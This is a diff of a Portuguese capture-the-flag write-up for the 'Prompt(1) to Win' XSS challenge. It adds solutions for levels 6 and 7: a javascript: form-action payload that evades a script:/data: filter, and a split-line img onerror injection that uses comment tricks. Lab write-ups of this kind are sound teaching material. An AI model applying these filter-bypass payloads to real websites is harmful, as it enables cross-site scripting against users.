@@ -1,6 +1,6 @@
 # Prompt(1) to Win
 ###### Solved by @joaoselim
->This CTF is about XSS, JavaScript, Injeção de Código
+>This challenge is about XSS, JavaScript, Injeção de Código
 ## About the challenge
 Nesse desafio de XSS(Cross-Site Scripting) temos o objetivo de realizar diversas injeções de código JavaScript, para chamar prompt(1) através de 15 níveis diferentes
 
@@ -111,11 +111,45 @@ HTML Source:
 
 Input:
 ```
-
+javascript:prompt(1)#{"action":1}
 ```
-resolução
+A entrada de javascript:prompt(1) é aceita por na filtragem só se restringir `script:` ou `data:`, usando `#` com função de split assim preenchendo as partes de acordo:
+```
+var segments = input.split('#');
+var formURL = segments[0];      // "javascript:prompt(1)"
+var formData = JSON.parse(segments[1]); // {"action":1}
+```
+assim definindo javascript:prompt(1) como action
 
 HTML Source:
 ```
-
+<form action="javascript:prompt(1)" method="post"><input name="action" value="1"></form>                         
+<script>                                                  
+    // forbid javascript: or vbscript: and data: stuff    
+    if (!/script:|data:/i.test(document.forms[0].action)) 
+        document.forms[0].submit();                       
+    else                                                  
+        document.write("Action forbidden.")               
+</script>    
 ```
+
+#### Desafio 7:
+
+[![questao7.png](https://i.postimg.cc/3wm8yZs0/questao7.png)](https://postimg.cc/XZNSm97n)
+
+Input:
+```
+"><img/src=#"onerror='/*#*/prompt(1)'
+```
+Nesse desafio se tem um limite de 12 caracteres por linha e se divide a entrada com `#`, com isso temos de montar em partes nosso código.
+Então assim como no desafio 5, temos uma imagem com src falso, e para que a atribuição do que se deve fazer ao dar erro não seja atrapalhada, nós comentamos o trecho da linha `<p class="comment" title="` terminando a linha de cima com `/*` e começando a próxima com `*/`
+
+HTML Source:
+```
+<p class="comment" title=""><img/src="></p>
+<p class="comment" title=""onerror='/*"></p>
+<p class="comment" title="*/prompt(1)'"></p>
+```
+
+#### Desafio 8:
+
